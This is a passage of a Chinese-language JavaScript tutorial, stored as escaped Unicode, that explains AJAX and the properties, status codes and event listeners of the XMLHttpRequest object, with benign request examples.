\u4e5f\u57282006\u5e74\u53d1\u5e03\u4e86\u5b83\u7684\u56fd\u9645\u6807\u51c6\u3002 \u5177\u4f53\u6765\u8bf4\uff0cAJAX \u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\u3002 \u521b\u5efa XMLHttpRequest \u5b9e\u4f8b \u53d1\u51fa HTTP \u8bf7\u6c42 \u63a5\u6536\u670d\u52a1\u5668\u4f20\u56de\u7684\u6570\u636e \u66f4\u65b0\u7f51\u9875\u6570\u636e \u6982\u62ec\u8d77\u6765\uff0c\u5c31\u662f\u4e00\u53e5\u8bdd\uff0cAJAX \u901a\u8fc7\u539f\u751f\u7684 XMLHttpRequest \u5bf9\u8c61\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u5f97\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u540e\uff0c\u518d\u8fdb\u884c\u5904\u7406\u3002\u73b0\u5728\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u90fd\u662f JSON \u683c\u5f0f\u7684\u6570\u636e\uff0cXML \u683c\u5f0f\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff0c\u4f46\u662f AJAX \u8fd9\u4e2a\u540d\u5b57\u5df2\u7ecf\u6210\u4e86\u4e00\u4e2a\u901a\u7528\u540d\u8bcd\uff0c\u5b57\u9762\u542b\u4e49\u5df2\u7ecf\u6d88\u5931\u4e86\u3002 XMLHttpRequest \u5bf9\u8c61\u662f AJAX \u7684\u4e3b\u8981\u63a5\u53e3\uff0c\u7528\u4e8e\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5c3d\u7ba1\u540d\u5b57\u91cc\u9762\u6709 XML \u548c Http \uff0c\u5b83\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u534f\u8bae\uff08\u6bd4\u5982 file \u6216 ftp \uff09\uff0c\u53d1\u9001\u4efb\u4f55\u683c\u5f0f\u7684\u6570\u636e\uff08\u5305\u62ec\u5b57\u7b26\u4e32\u548c\u4e8c\u8fdb\u5236\uff09\u3002 XMLHttpRequest \u672c\u8eab\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 new \u547d\u4ee4\u751f\u6210\u5b9e\u4f8b\u3002\u5b83\u6ca1\u6709\u4efb\u4f55\u53c2\u6570\u3002 1 var xhr = new XMLHttpRequest (); \u4e00\u65e6\u65b0\u5efa\u5b9e\u4f8b\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 open() \u65b9\u6cd5\u6307\u5b9a\u5efa\u7acb HTTP \u8fde\u63a5\u7684\u4e00\u4e9b\u7ec6\u8282\u3002 1 xhr . open ( 'GET' , 'http://www.example.com/page.php' , true ); \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u4f7f\u7528 GET \u65b9\u6cd5\uff0c\u8ddf\u6307\u5b9a\u7684\u670d\u52a1\u5668\u7f51\u5740\u5efa\u7acb\u8fde\u63a5\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570 true \uff0c\u8868\u793a\u8bf7\u6c42\u662f\u5f02\u6b65\u7684\u3002 \u7136\u540e\uff0c\u6307\u5b9a\u56de\u8c03\u51fd\u6570\uff0c\u76d1\u542c\u901a\u4fe1\u72b6\u6001\uff08 readyState \u5c5e\u6027\uff09\u7684\u53d8\u5316\u3002 1 2 3 4 5 xhr . onreadystatechange = handleStateChange ; function handleStateChange () { // ... } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6 XMLHttpRequest \u5b9e\u4f8b\u7684\u72b6\u6001\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u8c03\u7528\u76d1\u542c\u51fd\u6570 handleStateChange \u6700\u540e\u4f7f\u7528 send() \u65b9\u6cd5\uff0c\u5b9e\u9645\u53d1\u51fa\u8bf7\u6c42\u3002 1 xhr . send ( null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c send() \u7684\u53c2\u6570\u4e3a null \uff0c\u8868\u793a\u53d1\u9001\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u4e0d\u5e26\u6709\u6570\u636e\u4f53\u3002\u5982\u679c\u53d1\u9001\u7684\u662f POST \u8bf7\u6c42\uff0c\u8fd9\u91cc\u5c31\u9700\u8981\u6307\u5b9a\u6570\u636e\u4f53\u3002 \u4e00\u65e6\u62ff\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\uff0cAJAX \u4e0d\u4f1a\u5237\u65b0\u6574\u4e2a\u7f51\u9875\uff0c\u800c\u662f\u53ea\u66f4\u65b0\u7f51\u9875\u91cc\u9762\u7684\u76f8\u5173\u90e8\u5206\uff0c\u4ece\u800c\u4e0d\u6253\u65ad\u7528\u6237\u6b63\u5728\u505a\u7684\u4e8b\u60c5\u3002 \u6ce8\u610f\uff0cAJAX \u53ea\u80fd\u5411\u540c\u6e90\u7f51\u5740\uff08\u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u90fd\u76f8\u540c\uff09\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u5982\u679c\u53d1\u51fa\u8de8\u57df\u8bf7\u6c42\uff0c\u5c31\u4f1a\u62a5\u9519\uff08\u8be6\u89c1\u300a\u540c\u6e90\u653f\u7b56\u300b\u548c\u300aCORS \u901a\u4fe1\u300b\u4e24\u7ae0\uff09\u3002 \u4e0b\u9762\u662f XMLHttpRequest \u5bf9\u8c61\u7b80\u5355\u7528\u6cd5\u7684\u5b8c\u6574\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function (){ // \u901a\u4fe1\u6210\u529f\u65f6\uff0c\u72b6\u6001\u503c\u4e3a4 if ( xhr . readyState === 4 ){ if ( xhr . status === 200 ){ console . log ( xhr . responseText ); } else { console . error ( xhr . statusText ); } } }; xhr . onerror = function ( e ) { console . error ( xhr . statusText ); }; xhr . open ( 'GET' , '/endpoint' , true ); xhr . send ( null ); XMLHttpRequest \u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 XMLHttpRequest.readyState \u00b6 XMLHttpRequest.readyState \u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5f53\u524d\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002\u5b83\u53ef\u80fd\u8fd4\u56de\u4ee5\u4e0b\u503c\u3002 0\uff0c\u8868\u793a XMLHttpRequest \u5b9e\u4f8b\u5df2\u7ecf\u751f\u6210\uff0c\u4f46\u662f\u5b9e\u4f8b\u7684 open() \u65b9\u6cd5\u8fd8\u6ca1\u6709\u88ab\u8c03\u7528\u3002 1\uff0c\u8868\u793a open() \u65b9\u6cd5\u5df2\u7ecf\u8c03\u7528\uff0c\u4f46\u662f\u5b9e\u4f8b\u7684 send() \u65b9\u6cd5\u8fd8\u6ca1\u6709\u8c03\u7528\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u5b9e\u4f8b\u7684 setRequestHeader() \u65b9\u6cd5\uff0c\u8bbe\u5b9a HTTP \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002 2\uff0c\u8868\u793a\u5b9e\u4f8b\u7684 send() \u65b9\u6cd5\u5df2\u7ecf\u8c03\u7528\uff0c\u5e76\u4e14\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5934\u4fe1\u606f\u548c\u72b6\u6001\u7801\u5df2\u7ecf\u6536\u5230\u3002 3\uff0c\u8868\u793a\u6b63\u5728\u63a5\u6536\u670d\u52a1\u5668\u4f20\u6765\u7684\u6570\u636e\u4f53\uff08body \u90e8\u5206\uff09\u3002\u8fd9\u65f6\uff0c\u5982\u679c\u5b9e\u4f8b\u7684 responseType \u5c5e\u6027\u7b49\u4e8e text \u6216\u8005\u7a7a\u5b57\u7b26\u4e32\uff0c responseText \u5c5e\u6027\u5c31\u4f1a\u5305\u542b\u5df2\u7ecf\u6536\u5230\u7684\u90e8\u5206\u4fe1\u606f\u3002 4\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u5df2\u7ecf\u5b8c\u5168\u63a5\u6536\uff0c\u6216\u8005\u672c\u6b21\u63a5\u6536\u5df2\u7ecf\u5931\u8d25\u3002 \u901a\u4fe1\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u5f53\u5b9e\u4f8b\u5bf9\u8c61\u53d1\u751f\u72b6\u6001\u53d8\u5316\uff0c\u5b83\u7684 readyState \u5c5e\u6027\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002\u8fd9\u4e2a\u503c\u6bcf\u4e00\u6b21\u53d8\u5316\uff0c\u90fd\u4f1a\u89e6\u53d1 readyStateChange \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); if ( xhr . readyState === 4 ) { // \u8bf7\u6c42\u7ed3\u675f\uff0c\u5904\u7406\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e } else { // \u663e\u793a\u63d0\u793a\u201c\u52a0\u8f7d\u4e2d\u2026\u2026\u201d } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c xhr.readyState \u7b49\u4e8e 4 \u65f6\uff0c\u8868\u660e\u811a\u672c\u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u5df2\u7ecf\u5b8c\u6210\u3002\u5176\u4ed6\u60c5\u51b5\uff0c\u90fd\u8868\u793a HTTP \u8bf7\u6c42\u8fd8\u5728\u8fdb\u884c\u4e2d\u3002 XMLHttpRequest.onreadystatechange \u00b6 XMLHttpRequest.onreadystatechange \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u3002 readystatechange \u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u5b9e\u4f8b\u7684 readyState \u5c5e\u6027\u53d8\u5316\uff09\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u5c5e\u6027\u3002 \u53e6\u5916\uff0c\u5982\u679c\u4f7f\u7528\u5b9e\u4f8b\u7684 abort() \u65b9\u6cd5\uff0c\u7ec8\u6b62 XMLHttpRequest \u8bf7\u6c42\uff0c\u4e5f\u4f1a\u9020\u6210 readyState \u5c5e\u6027\u53d8\u5316\uff0c\u5bfc\u81f4\u8c03\u7528 XMLHttpRequest.onreadystatechange \u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com' , true ); xhr . onreadystatechange = function () { if ( xhr . readyState !== 4 || xhr . status !== 200 ) { return ; } console . log ( xhr . responseText ); }; xhr . send (); XMLHttpRequest.response \u00b6 XMLHttpRequest.response \u5c5e\u6027\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u4f53\uff08\u5373 HTTP \u56de\u5e94\u7684 body \u90e8\u5206\uff09\u3002\u5b83\u53ef\u80fd\u662f\u4efb\u4f55\u6570\u636e\u7c7b\u578b\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u3001\u5bf9\u8c61\u3001\u4e8c\u8fdb\u5236\u5bf9\u8c61\u7b49\u7b49\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u7531 XMLHttpRequest.responseType \u5c5e\u6027\u51b3\u5b9a\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u5982\u679c\u672c\u6b21\u8bf7\u6c42\u6ca1\u6709\u6210\u529f\u6216\u8005\u6570\u636e\u4e0d\u5b8c\u6574\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002\u4f46\u662f\uff0c\u5982\u679c responseType \u5c5e\u6027\u7b49\u4e8e text \u6216\u7a7a\u5b57\u7b26\u4e32\uff0c\u5728\u8bf7\u6c42\u6ca1\u6709\u7ed3\u675f\u4e4b\u524d\uff08 readyState \u7b49\u4e8e3\u7684\u9636\u6bb5\uff09\uff0c response \u5c5e\u6027\u5305\u542b\u670d\u52a1\u5668\u5df2\u7ecf\u8fd4\u56de\u7684\u90e8\u5206\u6570\u636e\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function () { if ( xhr . readyState === 4 ) { handler ( xhr . response ); } } XMLHttpRequest.responseType \u00b6 XMLHttpRequest.responseType \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u6570\u636e\u7684\u7c7b\u578b\u3002\u8fd9\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u53ef\u4ee5\u5728\u8c03\u7528 open() \u65b9\u6cd5\u4e4b\u540e\u3001\u8c03\u7528 send() \u65b9\u6cd5\u4e4b\u524d\uff0c\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u5982\u4f55\u89e3\u8bfb\u8fd4\u56de\u7684\u6570\u636e\u3002\u5982\u679c responseType \u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5c31\u7b49\u540c\u4e8e\u9ed8\u8ba4\u503c text \u3002 XMLHttpRequest.responseType \u5c5e\u6027\u53ef\u4ee5\u7b49\u4e8e\u4ee5\u4e0b\u503c\u3002 \"\"\uff08\u7a7a\u5b57\u7b26\u4e32\uff09\uff1a\u7b49\u540c\u4e8e text \uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u6587\u672c\u6570\u636e\u3002 \"arraybuffer\"\uff1aArrayBuffer \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u6570\u7ec4\u3002 \"blob\"\uff1aBlob \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u5bf9\u8c61\u3002 \"document\"\uff1aDocument \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\u3002 \"json\"\uff1aJSON \u5bf9\u8c61\u3002 \"text\"\uff1a\u5b57\u7b26\u4e32\u3002 \u4e0a\u9762\u51e0\u79cd\u7c7b\u578b\u4e4b\u4e2d\uff0c text \u7c7b\u578b\u9002\u5408\u5927\u591a\u6570\u60c5\u51b5\uff0c\u800c\u4e14\u76f4\u63a5\u5904\u7406\u6587\u672c\u4e5f\u6bd4\u8f83\u65b9\u4fbf\u3002 document \u7c7b\u578b\u9002\u5408\u8fd4\u56de HTML / XML \u6587\u6863\u7684\u60c5\u51b5\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u6253\u5f00 CORS \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 Ajax \u6293\u53d6\u7f51\u9875\uff0c\u7136\u540e\u4e0d\u7528\u89e3\u6790 HTML \u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u5bf9\u6293\u53d6\u56de\u6765\u7684\u6570\u636e\u8fdb\u884c DOM \u64cd\u4f5c\u3002 blob \u7c7b\u578b\u9002\u5408\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\u56fe\u7247\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/path/to/image.png' , true ); xhr . responseType = 'blob' ; xhr . onload = function ( e ) { if ( this . status === 200 ) { var blob = new Blob ([ xhr . response ], { type : 'image/png' }); // \u6216\u8005 var blob = xhr . response ; } }; xhr . send (); \u5982\u679c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a ArrayBuffer \uff0c\u5c31\u53ef\u4ee5\u6309\u7167\u6570\u7ec4\u7684\u65b9\u5f0f\u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/path/to/image.png' , true ); xhr . responseType = 'arraybuffer' ; xhr . onload = function ( e ) { var uInt8Array = new Uint8Array ( this . response ); for ( var i = 0 , len = uInt8Array . length ; i < len ; ++ i ) { // var byte = uInt8Array[i]; } }; xhr . send (); \u5982\u679c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a json \uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u81ea\u52a8\u5bf9\u8fd4\u56de\u6570\u636e\u8c03\u7528 JSON.parse() \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece xhr.response \u5c5e\u6027\uff08\u6ce8\u610f\uff0c\u4e0d\u662f xhr.responseText \u5c5e\u6027\uff09\u5f97\u5230\u7684\u4e0d\u662f\u6587\u672c\uff0c\u800c\u662f\u4e00\u4e2a JSON \u5bf9\u8c61\u3002 XMLHttpRequest.responseText \u00b6 XMLHttpRequest.responseText \u5c5e\u6027\u8fd4\u56de\u4ece\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684\u5b57\u7b26\u4e32\uff0c\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002\u53ea\u6709 HTTP \u8bf7\u6c42\u5b8c\u6210\u63a5\u6536\u4ee5\u540e\uff0c\u8be5\u5c5e\u6027\u624d\u4f1a\u5305\u542b\u5b8c\u6574\u7684\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/server' , true ); xhr . responseType = 'text' ; xhr . onload = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { console . log ( xhr . responseText ); } }; xhr . send ( null ); XMLHttpRequest.responseXML \u00b6 XMLHttpRequest.responseXML \u5c5e\u6027\u8fd4\u56de\u4ece\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684 HTML \u6216 XML \u6587\u6863\u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002\u5982\u679c\u672c\u6b21\u8bf7\u6c42\u6ca1\u6709\u6210\u529f\uff0c\u6216\u8005\u6536\u5230\u7684\u6570\u636e\u4e0d\u80fd\u88ab\u89e3\u6790\u4e3a XML \u6216 HTML\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002 \u8be5\u5c5e\u6027\u751f\u6548\u7684\u524d\u63d0\u662f HTTP \u56de\u5e94\u7684 Content-Type \u5934\u4fe1\u606f\u7b49\u4e8e text/xml \u6216 application/xml \u3002\u8fd9\u8981\u6c42\u5728\u53d1\u9001\u8bf7\u6c42\u524d\uff0c XMLHttpRequest.responseType \u5c5e\u6027\u8981\u8bbe\u4e3a document \u3002\u5982\u679c HTTP \u56de\u5e94\u7684 Content-Type \u5934\u4fe1\u606f\u4e0d\u7b49\u4e8e text/xml \u548c application/xml \uff0c\u4f46\u662f\u60f3\u4ece responseXML \u62ff\u5230\u6570\u636e\uff08\u5373\u628a\u6570\u636e\u6309\u7167 DOM \u683c\u5f0f\u89e3\u6790\uff09\uff0c\u90a3\u4e48\u9700\u8981\u624b\u52a8\u8c03\u7528 XMLHttpRequest.overrideMimeType() \u65b9\u6cd5\uff0c\u5f3a\u5236\u8fdb\u884c XML \u89e3\u6790\u3002 \u8be5\u5c5e\u6027\u5f97\u5230\u7684\u6570\u636e\uff0c\u662f\u76f4\u63a5\u89e3\u6790\u540e\u7684\u6587\u6863 DOM \u6811\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , '/server' , true ); xhr . responseType = 'document' ; xhr . overrideMimeType ( 'text/xml' ); xhr . onload = function () { if ( xhr . readyState === 4 && xhr . status === 200 ) { console . log ( xhr . responseXML ); } }; xhr . send ( null ); XMLHttpRequest.responseURL \u00b6 XMLHttpRequest.responseURL \u5c5e\u6027\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u9001\u6570\u636e\u7684\u670d\u52a1\u5668\u7684\u7f51\u5740\u3002 1 2 3 4 5 6 7 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com/test' , true ); xhr . onload = function () { // \u8fd4\u56de http://example.com/test console . log ( xhr . responseURL ); }; xhr . send ( null ); \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u4e0e open() \u65b9\u6cd5\u6307\u5b9a\u7684\u8bf7\u6c42\u7f51\u5740\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002\u5982\u679c\u670d\u52a1\u5668\u7aef\u53d1\u751f\u8df3\u8f6c\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u6700\u540e\u5b9e\u9645\u8fd4\u56de\u6570\u636e\u7684\u7f51\u5740\u3002\u53e6\u5916\uff0c\u5982\u679c\u539f\u59cb URL \u5305\u62ec\u951a\u70b9\uff08fragment\uff09\uff0c\u8be5\u5c5e\u6027\u4f1a\u628a\u951a\u70b9\u5265\u79bb\u3002 XMLHttpRequest.status\uff0cXMLHttpRequest.statusText \u00b6 XMLHttpRequest.status \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u670d\u52a1\u5668\u56de\u5e94\u7684 HTTP \u72b6\u6001\u7801\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u901a\u4fe1\u6210\u529f\u7684\u8bdd\uff0c\u8fd9\u4e2a\u72b6\u6001\u7801\u662f200\uff1b\u5982\u679c\u670d\u52a1\u5668\u6ca1\u6709\u8fd4\u56de\u72b6\u6001\u7801\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5c5e\u6027\u9ed8\u8ba4\u662f200\u3002\u8bf7\u6c42\u53d1\u51fa\u4e4b\u524d\uff0c\u8be5\u5c5e\u6027\u4e3a 0 \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 200, OK\uff0c\u8bbf\u95ee\u6b63\u5e38 301, Moved Permanently\uff0c\u6c38\u4e45\u79fb\u52a8 302, Moved temporarily\uff0c\u6682\u65f6\u79fb\u52a8 304, Not Modified\uff0c\u672a\u4fee\u6539 307, Temporary Redirect\uff0c\u6682\u65f6\u91cd\u5b9a\u5411 401, Unauthorized\uff0c\u672a\u6388\u6743 403, Forbidden\uff0c\u7981\u6b62\u8bbf\u95ee 404, Not Found\uff0c\u672a\u53d1\u73b0\u6307\u5b9a\u7f51\u5740 500, Internal Server Error\uff0c\u670d\u52a1\u5668\u53d1\u751f\u9519\u8bef \u57fa\u672c\u4e0a\uff0c\u53ea\u67092xx\u548c304\u7684\u72b6\u6001\u7801\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u662f\u6b63\u5e38\u72b6\u6001\u3002 1 2 3 4 5 6 7 8 if ( xhr . readyState === 4 ) { if ( ( xhr . status >= 200 && xhr . status < 300 ) || ( xhr . status === 304 ) ) { // \u5904\u7406\u670d\u52a1\u5668\u7684\u8fd4\u56de\u6570\u636e } else { // \u51fa\u9519 } } XMLHttpRequest.statusText \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u53d1\u9001\u7684\u72b6\u6001\u63d0\u793a\u3002\u4e0d\u540c\u4e8e status \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u5305\u542b\u6574\u4e2a\u72b6\u6001\u4fe1\u606f\uff0c\u6bd4\u5982\u201cOK\u201d\u548c\u201cNot Found\u201d\u3002\u5728\u8bf7\u6c42\u53d1\u9001\u4e4b\u524d\uff08\u5373\u8c03\u7528 open() \u65b9\u6cd5\u4e4b\u524d\uff09\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u662f\u7a7a\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u670d\u52a1\u5668\u6ca1\u6709\u8fd4\u56de\u72b6\u6001\u63d0\u793a\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u9ed8\u8ba4\u4e3a\u201cOK\u201d\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\u3002 XMLHttpRequest.timeout\uff0cXMLHttpRequestEventTarget.ontimeout \u00b6 XMLHttpRequest.timeout \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u591a\u5c11\u6beb\u79d2\u540e\uff0c\u5982\u679c\u8bf7\u6c42\u4ecd\u7136\u6ca1\u6709\u5f97\u5230\u7ed3\u679c\uff0c\u5c31\u4f1a\u81ea\u52a8\u7ec8\u6b62\u3002\u5982\u679c\u8be5\u5c5e\u6027\u7b49\u4e8e0\uff0c\u5c31\u8868\u793a\u6ca1\u6709\u65f6\u95f4\u9650\u5236\u3002 XMLHttpRequestEventTarget.ontimeout \u5c5e\u6027\u7528\u4e8e\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u5982\u679c\u53d1\u751f timeout \u4e8b\u4ef6\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var xhr = new XMLHttpRequest (); var url = '/server' ; xhr . ontimeout = function () { console . error ( 'The request for ' + url + ' timed out.' ); }; xhr . onload = function () { if ( xhr . readyState === 4 ) { if ( xhr . status === 200 ) { // \u5904\u7406\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e } else { console . error ( xhr . statusText ); } } }; xhr . open ( 'GET' , url , true ); // \u6307\u5b9a 10 \u79d2\u949f\u8d85\u65f6 xhr . timeout = 10 * 1000 ; xhr . send ( null ); \u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027 \u00b6 XMLHttpRequest \u5bf9\u8c61\u53ef\u4ee5\u5bf9\u4ee5\u4e0b\u4e8b\u4ef6\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 XMLHttpRequest.onloadstart\uff1aloadstart \u4e8b\u4ef6\uff08HTTP \u8bf7\u6c42\u53d1\u51fa\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onprogress\uff1aprogress\u4e8b\u4ef6\uff08\u6b63\u5728\u53d1\u9001\u548c\u52a0\u8f7d\u6570\u636e\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onabort\uff1aabort \u4e8b\u4ef6\uff08\u8bf7\u6c42\u4e2d\u6b62\uff0c\u6bd4\u5982\u7528\u6237\u8c03\u7528\u4e86 abort() \u65b9\u6cd5\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onerror\uff1aerror \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onload\uff1aload \u4e8b\u4ef6\uff08\u8bf7\u6c42\u6210\u529f\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.ontimeout\uff1atimeout \u4e8b\u4ef6\uff08\u7528\u6237\u6307\u5b9a\u7684\u65f6\u9650\u8d85\u8fc7\u4e86\uff0c\u8bf7\u6c42\u8fd8\u672a\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onloadend\uff1aloadend \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5b8c\u6210\uff0c\u4e0d\u7ba1\u6210\u529f\u6216\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 xhr . onload = function () { var responseText = xhr . responseText ; console . log ( responseText ); // process the response. }; xhr . onabort = function () { console . log ( 'The request was aborted' ); }; xhr . onprogress = function ( event ) { console . log ( event . loaded ); console . log ( event . total ); }; xhr . onerror = function () { console . log ( 'There was an error!' ); }; progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6709\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u53c2\u6570\uff0c\u8be5\u5bf9\u8c61\u6709\u4e09\u4e2a\u5c5e\u6027\uff1a loaded \u5c5e\u6027\u8fd4\u56de\u5df2\u7ecf\u4f20\u8f93\u7684\u6570\u636e\u91cf\uff0c total \u5c5e\u6027\u8fd4\u56de\u603b\u7684\u6570\u636e\u91cf\uff0c lengthComputable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u52a0\u8f7d\u7684\u8fdb\u5ea6\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97\u3002\u6240\u6709\u8fd9\u4e9b\u76d1\u542c\u51fd\u6570\u91cc\u9762\uff0c\u53ea\u6709 progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6709\u53c2\u6570\uff0c\u5176\u4ed6\u51fd\u6570\u90fd\u6ca1\u6709\u53c2\u6570\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u53d1\u751f\u7f51\u7edc\u9519\u8bef\uff08\u6bd4\u5982\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u901a\uff09\uff0c onerror 